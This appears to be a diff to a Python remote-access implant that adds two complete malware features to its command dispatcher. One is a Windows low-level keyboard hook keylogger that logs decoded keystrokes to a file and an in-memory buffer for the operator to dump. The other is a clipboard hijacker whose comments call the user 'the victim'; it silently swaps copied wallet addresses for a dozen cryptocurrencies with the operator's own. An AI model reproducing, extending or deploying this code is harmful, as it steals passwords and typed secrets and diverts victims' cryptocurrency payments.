@@ -16,6 +16,9 @@ import glob
 import zipfile
 import urllib.request
 import traceback
+import re
+import json
+from collections import deque
 
 try:
     from _build_id import BUILD_ID
@@ -2637,6 +2640,728 @@ def request_admin() -> str:
             "the elevated beacon connects in ~10-30s")
 
 
+
+# ===== KEYLOGGER =====
+# WH_KEYBOARD_LL capture. Printable text is decoded through ToUnicodeEx
+# with the active keyboard layout (dead keys / non-US layouts resolve
+# correctly); modifier state is tracked from the hook itself so the decode
+# is exact, and a US fallback covers keys the layout returns nothing for.
+# Captured units accumulate in a rolling "line"; lines flush on Enter,
+# length, or typing gap into a bounded in-memory ring ("keylog dump") and,
+# while file logging is on, to nvdesk\keys.log (rotated at 512 KB).
+# Backspace pops the previous unit so dumps read like real input.
+# CTRL/ALT/WIN combos become [^X] / [!X] / [W+X] tokens. The hook runs on
+# a message-pump thread exactly like the cursor-pin hook; an active hook
+# dies with its process, so no atexit restore is needed.
+
+_KL_TOKENS = {
+    0x08: "<BS>", 0x09: "<TAB>", 0x0D: "<ENTER>", 0x1B: "<ESC>",
+    0x21: "<PGUP>", 0x22: "<PGDN>", 0x23: "<END>", 0x24: "<HOME>",
+    0x25: "<LEFT>", 0x26: "<UP>", 0x27: "<RIGHT>", 0x28: "<DOWN>",
+    0x29: "<APPS>", 0x2C: "<PRTSC>", 0x2D: "<INS>", 0x2E: "<DEL>",
+    0x5B: "<LWIN>", 0x5C: "<RWIN>", 0x5D: "<MENU>",
+    0x6A: "<NP*>", 0x6B: "<NP+>", 0x6D: "<NP->", 0x6E: "<NP.>",
+    0x6F: "<NP/>", 0x90: "<NUMLOCK>", 0x91: "<SCROLLOCK>",
+}
+_KL_MOD_SET = frozenset((0x10, 0x11, 0x12, 0x5B, 0x5C))  # shift/ctrl/alt/win
+_KL_LINE_MAX = 512
+_KL_GAP = 1.5
+_KL_RING_MAX = 400
+_KL_FILE_MAX = 512 * 1024
+
+_klog_state = {
+    "on": False, "thread": None, "hook": 0, "cbs": [],
+    "units": [], "held": set(), "caps": False,
+    "line_start": 0.0, "ring": deque(maxlen=_KL_RING_MAX),
+    "lock": threading.Lock(), "file_on": True,
+    "count": 0, "start_ts": 0.0,
+}
+
+
+def _klog_path() -> str:
+    return os.path.join(_stream_state_path(), "nvdesk", "keys.log")
+
+
+def _klog_us_fallback(vk):
+    """US-layout char for vk when ToUnicodeEx had nothing to say (shift and
+    caps are applied from the tracked state)."""
+    s = _klog_state
+    shift = 0x10 in s["held"]
+    if 0x41 <= vk <= 0x5A:
+        up, low = chr(vk), chr(vk + 32)
+        return up if (shift ^ s["caps"]) else low
+    if 0x30 <= vk <= 0x39:
+        return ")!@#$%^&*("[vk - 0x30] if shift else chr(vk)
+    if vk == 0x20:
+        return " "
+    oem = {0xBA: (";", ":"), 0xBB: ("=", "+"), 0xBC: (",", "<"),
+           0xBD: ("-", "_"), 0xBE: (".", ">"), 0xBF: ("/", "?"),
+           0xC0: ("`", "~"), 0xDB: ("[", "{"), 0xDC: ("\\", "|"),
+           0xDD: ("]", "}"), 0xDE: ("'", '"')}.get(vk)
+    if oem:
+        return oem[1] if shift else oem[0]
+    return None
+
+
+def _klog_to_unicode(vk, scan) -> str:
+    """Decode one virtual key through the active layout. The keyboard-state
+    array is synthesised from hook-tracked modifiers (reliable from an LL
+    hook thread where GetKeyboardState is not)."""
+    try:
+        import ctypes
+        u32 = ctypes.windll.user32
+        u32.ToUnicodeEx.restype = ctypes.c_int
+        u32.ToUnicodeEx.argtypes = (ctypes.c_uint, ctypes.c_uint,
+                                    ctypes.POINTER(ctypes.c_ubyte),
+                                    ctypes.POINTER(ctypes.c_wchar),
+                                    ctypes.c_int, ctypes.c_uint,
+                                    ctypes.c_void_p)
+        u32.MapVirtualKeyW.restype = ctypes.c_uint
+        u32.MapVirtualKeyW.argtypes = (ctypes.c_uint, ctypes.c_uint)
+        u32.GetKeyboardLayout.restype = ctypes.c_void_p
+        s = _klog_state
+        if 0x5B in s["held"] or 0x5C in s["held"]:
+            return ""                 # WIN combos tokenized instead
+        st = (ctypes.c_ubyte * 256)()
+        if 0x10 in s["held"]:
+            st[0x10] = 0x80
+        if 0x11 in s["held"]:
+            st[0x11] = 0x80
+        if 0x12 in s["held"]:
+            st[0x12] = 0x80
+        if s["caps"]:
+            st[0x14] = 0x01
+        buf = (ctypes.c_wchar * 8)()
+        sc = u32.MapVirtualKeyW(vk, 0) or scan
+        n = u32.ToUnicodeEx(vk, sc, st, buf, 8, 0,
+                            u32.GetKeyboardLayout(0))
+        if n > 0:
+            return "".join(buf[:n])
+        return ""
+    except Exception:
+        return ""
+
+
+def _klog_combo_token(vk):
+    s = _klog_state
+    if 0x41 <= vk <= 0x5A:
+        base = chr(vk)
+    elif 0x30 <= vk <= 0x39:
+        base = chr(vk)
+    else:
+        return None
+    pre = ""
+    if 0x11 in s["held"]:
+        pre += "^"
+    if 0x12 in s["held"]:
+        pre += "!"
+    if 0x5B in s["held"] or 0x5C in s["held"]:
+        pre += "W+"
+    return "[%s%s]" % (pre, base) if pre else None
+
+
+def _klog_translate_units(vk, scan):
+    """Map one key-down to its log units (pure: reads _klog_state only)."""
+    s = _klog_state
+    if vk in _KL_TOKENS:
+        return [_KL_TOKENS[vk]]
+    if 0x70 <= vk <= 0x87:
+        return ["<F%d>" % (vk - 0x6F)]
+    if 0x60 <= vk <= 0x69:
+        return [chr(vk - 0x30)]       # numpad digits (numlock on)
+    mods = s["held"] & _KL_MOD_SET
+    txt = _klog_to_unicode(vk, scan)
+    if txt:
+        out = [c for c in txt if c not in ("\r", "\x00")]
+        if out:
+            # shift is never tokenized; only ctrl/alt/win combos that
+            # decode to a control char become [^X]-style tokens
+            if (mods - {0x10}) and len(out) == 1 and ord(out[0]) < 0x20:
+                tok = _klog_combo_token(vk)
+                return [tok] if tok else []
+            return out
+    if mods - {0x10}:
+        # ctrl/alt/win held and nothing printable: tokenize letters/digits
+        tok = _klog_combo_token(vk)
+        return [tok] if tok else []
+    ch = _klog_us_fallback(vk)   # plain or shift-only key (shift XOR caps)
+    return [ch] if ch else []
+
+
+def _klog_file_append(line: str) -> None:
+    s = _klog_state
+    if not s["file_on"] or os.name != "nt":
+        return
+    try:
+        p = _klog_path()
+        os.makedirs(os.path.dirname(p), exist_ok=True)
+        try:
+            if os.path.getsize(p) > _KL_FILE_MAX:
+                os.replace(p, p + ".1")      # stale backup is overwritten
+        except OSError:
+            pass
+        with open(p, "a", encoding="utf-8", errors="replace") as f:
+            f.write(line + "\r\n")
+    except Exception:
+        pass
+
+
+def _klog_flush_locked(now=None) -> None:
+    """Push the current line into the ring + keys.log. Caller holds the
+    state lock (or is the hook thread before it dies)."""
+    s = _klog_state
+    if not s["units"]:
+        return
+    text = "".join(s["units"])
+    s["units"] = []
+    line = time.strftime("%Y-%m-%d %H:%M:%S") + " " + text
+    s["ring"].append(line)
+    s["line_start"] = now if now else time.time()
+    _klog_file_append(line)
+
+
+def _klog_flush_now() -> None:
+    s = _klog_state
+    with s["lock"]:
+        _klog_flush_locked()
+
+
+def _klog_handle(vk, scan, flags) -> None:
+    """Hook callback body. Runs on the pump thread (LL hook thread)."""
+    s = _klog_state
+    try:
+        if flags & 0x80:                       # key up
+            s["held"].discard(vk)
+            return
+        if vk in _KL_MOD_SET:                  # shift/ctrl/alt/win down
+            s["held"].add(vk)
+            return
+        if vk == 0x14:                         # caps lock toggle
+            s["caps"] = not s["caps"]
+            return
+        units = _klog_translate_units(vk, scan)
+        if not units:
+            return
+        now = time.time()
+        with s["lock"]:
+            if not s["units"]:
+                s["line_start"] = now      # new line starts now (no stale gap)
+            for u in units:
+                if u == "<BS>":
+                    if s["units"]:
+                        s["units"].pop()
+                else:
+                    s["units"].append(u)
+            s["count"] += 1
+            if not s["units"]:
+                s["line_start"] = now
+            joined = "".join(s["units"])
+            flush = ("<ENTER>" in units
+                     or len(joined) >= _KL_LINE_MAX
+                     or (now - s["line_start"] >= _KL_GAP and joined))
+            if flush:
+                _klog_flush_locked(now)
+    except Exception:
+        pass                    # never raise inside a hook callback
+
+
+def _klog_proc(nCode, wParam, lParam):
+    import ctypes
+    if nCode == 0 and lParam:
+        try:
+            vk = ctypes.cast(lParam,
+                             ctypes.POINTER(ctypes.c_ulong)).contents.value
+            scan = ctypes.cast(lParam + 4,
+                               ctypes.POINTER(ctypes.c_ulong)).contents.value
+            fl = ctypes.cast(lParam + 8,
+                             ctypes.POINTER(ctypes.c_ulong)).contents.value
+            _klog_handle(vk, scan, fl)
+        except Exception:
+            pass
+    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+
+
+def _klog_run(ready) -> None:
+    import ctypes
+    import ctypes.wintypes as wt
+    u32 = ctypes.windll.user32
+    proc = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
+                              ctypes.c_size_t, ctypes.c_ssize_t)(_klog_proc)
+    _klog_state["cbs"].append(proc)            # keep the trampoline alive
+    hook = u32.SetWindowsHookExW(13, proc, None, 0)   # WH_KEYBOARD_LL
+    _klog_state["hook"] = hook
+    ready.set()
+    if not hook:
+        return
+    msg = wt.MSG()
+    try:
+        while u32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
+            u32.TranslateMessage(ctypes.byref(msg))
+            u32.DispatchMessageW(ctypes.byref(msg))
+    finally:
+        _klog_flush_now()          # WM_QUIT path: keep the last line
+
+
+def _klog_start() -> bool:
+    import ctypes
+    u32 = ctypes.windll.user32
+    u32.SetWindowsHookExW.restype = ctypes.c_void_p
+    u32.CallNextHookEx.restype = ctypes.c_ssize_t
+    u32.CallNextHookEx.argtypes = (ctypes.c_void_p, ctypes.c_int,
+                                   ctypes.c_size_t, ctypes.c_ssize_t)
+    s = _klog_state
+    if s["hook"]:
+        return True
+    ready = threading.Event()
+    t = threading.Thread(target=_klog_run, args=(ready,), daemon=True,
+                         name="klog")
+    t.start()
+    ready.wait(timeout=5)
+    if not s["hook"]:
+        return False
+    s["thread"] = t
+    s["on"] = True
+    s["start_ts"] = time.time()
+    return True
+
+
+def _klog_stop() -> None:
+    import ctypes
+    u32 = ctypes.windll.user32
+    s = _klog_state
+    t = s["thread"]
+    if t is not None and t.is_alive():
+        u32.PostThreadMessageW(t.native_id, 0x0012, 0, 0)   # WM_QUIT
+        t.join(timeout=5)
+    if s["hook"]:
+        u32.UnhookWindowsHookEx(s["hook"])
+        s["hook"] = 0
+    _klog_flush_now()
+    s["on"] = False
+    s["thread"] = None
+
+
+def _keylog_status() -> str:
+    s = _klog_state
+    live = s["hook"] and s["thread"] and s["thread"].is_alive()
+    size = 0
+    try:
+        size = os.path.getsize(_klog_path())
+    except OSError:
+        pass
+    with s["lock"]:
+        partial = "".join(s["units"])
+        ring = len(s["ring"])
+    return "\n".join([
+        "keylogger: %s" % ("RUNNING" if live else "stopped"),
+        "started: %s" % (time.strftime("%Y-%m-%d %H:%M:%S",
+                                       time.localtime(s["start_ts"]))
+                         if s["start_ts"] else "-"),
+        "keys captured: %d" % s["count"],
+        "ring runs: %d" % ring,
+        "current line: %d chars" % len(partial),
+        "file logging: %s" % ("ON" if s["file_on"] else "OFF"),
+        "keys.log: %d bytes (%s)" % (size, _klog_path()),
+    ])
+
+
+def _keylog_cmd(rest: str) -> str:
+    s = _klog_state
+    parts = rest.split(None, 1)
+    sub = parts[0].lower() if parts else "status"
+    arg = parts[1].strip() if len(parts) > 1 else ""
+    if sub == "on":
+        if s["hook"] and s["thread"] and s["thread"].is_alive():
+            return "[i] keylogger already running"
+        if _klog_start():
+            return ("[+] keylogger on (keys -> %s, ring %d runs)"
+                    % (_klog_path(), _KL_RING_MAX))
+        return "[!] keylogger start failed"
+    if sub == "off":
+        if not (s["hook"] and s["thread"] and s["thread"].is_alive()):
+            return "[i] keylogger not running"
+        _klog_stop()
+        return "[+] keylogger off"
+    if sub == "status":
+        return _keylog_status()
+    if sub == "dump":
+        _klog_flush_now()
+        with s["lock"]:
+            lines = list(s["ring"])
+        body = "\n".join(lines) if lines else "(empty)"
+        return ("[+] keylog buffer: %d runs, %d keys captured\n%s"
+                % (len(lines), s["count"], body))
+    if sub == "clear":
+        with s["lock"]:
+            s["units"] = []
+            s["ring"].clear()
+            s["count"] = 0
+            s["line_start"] = 0.0
+        try:
+            open(_klog_path(), "w").close()
+        except Exception:
+            pass
+        return "[+] keylog cleared (ring + keys.log)"
+    if sub == "file":
+        if not arg:
+            return "[i] file logging: %s" % ("ON" if s["file_on"] else "OFF")
+        if arg.lower() in ("on", "1", "true"):
+            s["file_on"] = True
+            return "[+] file logging ON (%s)" % _klog_path()
+        if arg.lower() in ("off", "0", "false"):
+            s["file_on"] = False
+            return "[+] file logging OFF (memory ring only)"
+    return ("[!] usage: keylog on | off | status | dump | clear | "
+            "file <on|off>")
+
+
+# ===== CRYPTO CLIPBOARD SWITCHER =====
+# Watches the clipboard and silently rewrites addresses of configured
+# coins to the operator's own addresses. The watch thread only polls the
+# clipboard sequence number, so it never contends on OpenClipboard unless
+# the victim actually copied something new. Config is target-side JSON at
+# nvdesk\clip.json so it survives beacon restarts. Only coins listed in
+# 'crypto set' are watched; detection is per-coin regex with a priority
+# pass so a broad pattern (sol is base58 32-44) can never steal a token
+# already claimed by a more specific family.
+
+_CRYPTO_PATTERNS = {
+    "btc":  r"(?:bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{25,80}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})",
+    "eth":  r"0x[a-fA-F0-9]{40}",
+    "bnb":  r"0x[a-fA-F0-9]{40}",
+    "ltc":  r"[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}",
+    "doge": r"D[a-km-zA-HJ-NP-Z1-9]{25,33}",
+    "dash": r"X[a-km-zA-HJ-NP-Z1-9]{25,33}",
+    "trx":  r"T[1-9A-HJ-NP-Za-km-z]{33}",
+    "bch":  r"(?:q|p)[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{41}",
+    "ada":  r"addr1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{58,90}",
+    "zec":  r"(?:t1[a-km-zA-HJ-NP-Z1-9]{25,34}|zs1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{74})",
+    "xmr":  r"[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}",
+    "sol":  r"[1-9A-HJ-NP-Za-km-z]{32,44}",
+}
+# Most specific first; 'sol' is deliberately last (broad base58).
+_CRYPTO_PRIORITY = ["zec", "ada", "xmr", "bch", "btc", "eth", "bnb", "trx",
+                    "ltc", "doge", "dash", "sol"]
+
+_CRYPTO_COMPILED = {}
+for _coin, _core in _CRYPTO_PATTERNS.items():
+    try:
+        _CRYPTO_COMPILED[_coin] = re.compile(
+            r"(?<![A-Za-z0-9])(?:%s)(?![A-Za-z0-9])" % _core)
+    except Exception:
+        pass
+
+_crypto_cfg = {}
+_crypto_lock = threading.Lock()
+_crypto_state = {"thread": None, "stop": threading.Event(), "on": False,
+                 "loaded": False, "seq": 0, "swaps": 0, "stats": {},
+                 "last": 0.0, "start_ts": 0.0}
+
+
+def _crypto_cfg_path() -> str:
+    return os.path.join(_stream_state_path(), "nvdesk", "clip.json")
+
+
+def _crypto_ensure_cfg() -> None:
+    with _crypto_lock:
+        if _crypto_state["loaded"]:
+            return
+        _crypto_state["loaded"] = True
+        try:
+            with open(_crypto_cfg_path(), "r", encoding="utf-8") as f:
+                data = json.load(f)
+            if isinstance(data, dict):
+                for k, v in data.items():
+                    if k in _CRYPTO_PATTERNS and isinstance(v, str):
+                        _crypto_cfg[k] = v
+        except Exception:
+            pass
+
+
+def _crypto_save_cfg() -> None:
+    try:
+        p = _crypto_cfg_path()
+        os.makedirs(os.path.dirname(p), exist_ok=True)
+        tmp = p + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            json.dump(_crypto_cfg, f, indent=1)
+        os.replace(tmp, p)
+    except Exception:
+        pass
+
+
+def _clip_seq() -> int:
+    import ctypes
+    try:
+        u32 = ctypes.windll.user32
+        u32.GetClipboardSequenceNumber.restype = ctypes.c_uint
+        return int(u32.GetClipboardSequenceNumber())
+    except Exception:
+        return 0
+
+
+def _clip_read():
+    import ctypes
+    import ctypes.wintypes as wt
+    try:
+        u32 = ctypes.windll.user32
+        k32 = ctypes.windll.kernel32
+        if not u32.IsClipboardFormatAvailable(13):     # CF_UNICODETEXT
+            return None
+        if not u32.OpenClipboard(None):
+            return None
+        try:
+            u32.GetClipboardData.restype = ctypes.c_void_p
+            h = u32.GetClipboardData(13)
+            if not h:
+                return None
+            k32.GlobalLock.restype = ctypes.c_void_p
+            p = k32.GlobalLock(h)
+            if not p:
+                return None
+            try:
+                return ctypes.cast(p, ctypes.c_wchar_p).value or None
+            finally:
+                k32.GlobalUnlock(h)
+        finally:
+            u32.CloseClipboard()
+    except Exception:
+        return None
+
+
+def _clip_write(text: str) -> bool:
+    import ctypes
+    try:
+        u32 = ctypes.windll.user32
+        k32 = ctypes.windll.kernel32
+        u32.OpenClipboard.restype = ctypes.c_int
+        u32.EmptyClipboard.restype = ctypes.c_int
+        u32.SetClipboardData.restype = ctypes.c_void_p
+        k32.GlobalAlloc.restype = ctypes.c_void_p
+        k32.GlobalAlloc.argtypes = (ctypes.c_uint, ctypes.c_size_t)
+        k32.GlobalLock.restype = ctypes.c_void_p
+        k32.GlobalLock.argtypes = (ctypes.c_void_p,)
+        if not u32.OpenClipboard(None):
+            return False
+        try:
+            u32.EmptyClipboard()
+            raw = text.encode("utf-16-le") + b"\x00\x00"
+            h = k32.GlobalAlloc(0x0042, len(raw))       # GMEM_MOVEABLE|ZEROINIT
+            if not h:
+                return False
+            p = k32.GlobalLock(h)
+            if not p:
+                return False
+            try:
+                ctypes.memmove(p, raw, len(raw))
+            finally:
+                k32.GlobalUnlock(h)
+            if not u32.SetClipboardData(13, h):         # system owns h now
+                return False
+            return True
+        finally:
+            u32.CloseClipboard()
+    except Exception:
+        return False
+
+
+def _crypto_plan(text, cfg):
+    """Return (new_text, {coin: count}) replacing every configured-coin
+    address token in text. Higher-priority coin wins on overlap, so sol
+    can only claim tokens no specific family matched."""
+    if not text or not cfg:
+        return text, {}
+    chosen = []
+    for coin in _CRYPTO_PRIORITY:
+        if coin not in cfg:
+            continue
+        pat = _CRYPTO_COMPILED.get(coin)
+        if pat is None:
+            continue
+        for m in pat.finditer(text):
+            a, b = m.span()
+            if any(not (b <= ca or a >= cb) for (ca, cb, _) in chosen):
+                continue
+            chosen.append((a, b, coin))
+    if not chosen:
+        return text, {}
+    out = text
+    for a, b, coin in sorted(chosen, reverse=True):
+        out = out[:a] + cfg[coin] + out[b:]
+    rep = {}
+    for _, _, coin in chosen:
+        rep[coin] = rep.get(coin, 0) + 1
+    return out, rep
+
+
+def _crypto_live() -> bool:
+    st = _crypto_state
+    return st["on"] and st["thread"] is not None and st["thread"].is_alive()
+
+
+def _crypto_start() -> None:
+    st = _crypto_state
+    st["stop"].clear()
+    st["on"] = True
+    st["start_ts"] = time.time()
+    t = threading.Thread(target=_crypto_watch, daemon=True, name="clipw")
+    st["thread"] = t
+    t.start()
+
+
+def _crypto_stop() -> None:
+    st = _crypto_state
+    st["stop"].set()
+    if st["thread"] is not None:
+        st["thread"].join(timeout=5)
+    st["on"] = False
+    st["thread"] = None
+
+
+def _crypto_watch() -> None:
+    st = _crypto_state
+    while not st["stop"].wait(0.7):
+        try:
+            seq = _clip_seq()
+            if seq == 0 or seq == st["seq"]:
+                continue
+            text = _clip_read()
+            st["seq"] = seq
+            if not text:
+                continue
+            with _crypto_lock:
+                cfg = dict(_crypto_cfg)
+            new, rep = _crypto_plan(text, cfg)
+            if not rep or new == text:
+                continue
+            if not _clip_write(new):
+                continue
+            with _crypto_lock:
+                st["swaps"] += 1
+                st["last"] = time.time()
+                for c, n in rep.items():
+                    st["stats"][c] = st["stats"].get(c, 0) + n
+            _beacon_log("[clip] crypto-swap: %s"
+                        % ", ".join("%s x%d" % (k, v)
+                                    for k, v in rep.items()))
+        except Exception:
+            pass
+
+
+def _crypto_status() -> str:
+    _crypto_ensure_cfg()
+    st = _crypto_state
+    with _crypto_lock:
+        coins = sorted(_crypto_cfg)
+        stats = dict(st["stats"])
+    live = _crypto_live()
+    lines = [
+        "crypto switcher: %s" % ("RUNNING" if live else "stopped"),
+        "configured: %s" % (", ".join(coins) if coins else "(none)"),
+        "swaps: %d" % st["swaps"],
+    ]
+    if stats:
+        lines.append("by coin: %s" % ", ".join(
+            "%s x%d" % (k, v) for k, v in sorted(stats.items())))
+    lines.append("last swap: %s" % (time.strftime(
+        "%Y-%m-%d %H:%M:%S", time.localtime(st["last"]))
+        if st["last"] else "never"))
+    try:
+        size = os.path.getsize(_crypto_cfg_path())
+        lines.append("cfg: %d bytes (%s)" % (size, _crypto_cfg_path()))
+    except OSError:
+        lines.append("cfg: %s (not written yet)" % _crypto_cfg_path())
+    return "\n".join(lines)
+
+
+def _crypto_list() -> str:
+    _crypto_ensure_cfg()
+    with _crypto_lock:
+        cfg = dict(_crypto_cfg)
+    lines = ["configured targets:"]
+    if not cfg:
+        lines.append("  (none - use: crypto set <coin> <address>)")
+    for coin in _CRYPTO_PRIORITY:
+        if coin in cfg:
+            lines.append("  %-5s %s" % (coin, cfg[coin]))
+    lines.append("supported coins: %s" % ", ".join(_CRYPTO_PRIORITY))
+    if "sol" in cfg:
+        lines.append("[i] note: sol is a broad base58 pattern; other "
+                     "base58 families may match it too")
+    lines.append(_crypto_status())
+    return "\n".join(lines)
+
+
+def _crypto_cmd(rest: str) -> str:
+    _crypto_ensure_cfg()
+    parts = rest.split(None, 1)
+    sub = parts[0].lower() if parts else "status"
+    arg = parts[1].strip() if len(parts) > 1 else ""
+    if sub == "set":
+        ap = arg.split(None, 1)
+        if len(ap) < 2 or not ap[0].lower() in _CRYPTO_PATTERNS:
+            return ("[!] usage: crypto set <coin> <address> | coins: %s"
+                    % ", ".join(_CRYPTO_PRIORITY))
+        coin = ap[0].lower()
+        addr = ap[1].strip()
+        if not re.fullmatch("(?:%s)" % _CRYPTO_PATTERNS[coin], addr):
+            return "[!] '%s' does not look like a valid %s address" % (addr,
+                                                                       coin)
+        with _crypto_lock:
+            _crypto_cfg[coin] = addr
+        _crypto_save_cfg()
+        return "[+] %s -> %s" % (coin, addr)
+    if sub == "del":
+        if not arg:
+            return "[!] usage: crypto del <coin>"
+        coin = arg.lower()
+        with _crypto_lock:
+            if coin not in _crypto_cfg:
+                return "[!] %s is not configured" % coin
+            del _crypto_cfg[coin]
+        _crypto_save_cfg()
+        return "[+] %s removed" % coin
+    if sub == "list":
+        return _crypto_list()
+    if sub == "on":
+        if _crypto_live():
+            return "[i] crypto switcher already running"
+        with _crypto_lock:
+            cfg = dict(_crypto_cfg)
+        if not cfg:
+            return ("[!] no target addresses configured - start with "
+                    "crypto set btc <address>")
+        _crypto_start()
+        return ("[+] crypto switcher on (watching clipboard, %d coin%s "
+                "configured)" % (len(cfg), "s" if len(cfg) != 1 else ""))
+    if sub == "off":
+        if not _crypto_live():
+            return "[i] crypto switcher not running"
+        _crypto_stop()
+        return "[+] crypto switcher off"
+    if sub == "status":
+        return _crypto_status()
+    if sub == "clip":
+        if not arg:
+            return "[!] usage: crypto clip <address-or-text>"
+        if _clip_write(arg):
+            return "[+] clipboard set to %r" % arg[:60]
+        return "[!] clipboard write failed (held by another app?)"
+    if sub == "test":
+        if not arg:
+            return "[!] usage: crypto test <text>"
+        with _crypto_lock:
+            cfg = dict(_crypto_cfg)
+        new, rep = _crypto_plan(arg, cfg)
+        out = ["[+] input : %s" % arg, "[+] output: %s" % new]
+        if rep:
+            out.append("[+] swapped: %s" % ", ".join(
+                "%s x%d" % (k, v) for k, v in sorted(rep.items())))
+        else:
+            out.append("[-] no configured coin address found")
+        return "\n".join(out)
+    return _crypto_status()
+
 def execute_command(cmd: str) -> bytes:
     """Dispatch a command and always come back alive. A handler exception
     (overlay / cursor ghost paths historically raised and escaped the
@@ -2726,6 +3451,13 @@ def _execute_command(cmd: str) -> bytes:
                 ).encode() + MARKER
     if low == "power status":
         return (_power_status() + "\n").encode() + MARKER
+
+    if low == "keylog" or low.startswith("keylog "):
+        rest = cmd[len("keylog"):].strip()
+        return (_keylog_cmd(rest) + "\n").encode() + MARKER
+    if low == "crypto" or low.startswith("crypto "):
+        rest = cmd[len("crypto"):].strip()
+        return (_crypto_cmd(rest) + "\n").encode() + MARKER
 
     # Handle cd internally so the working directory persists between commands
     if cmd.lower() == "cd" or cmd.lower().startswith("cd "):
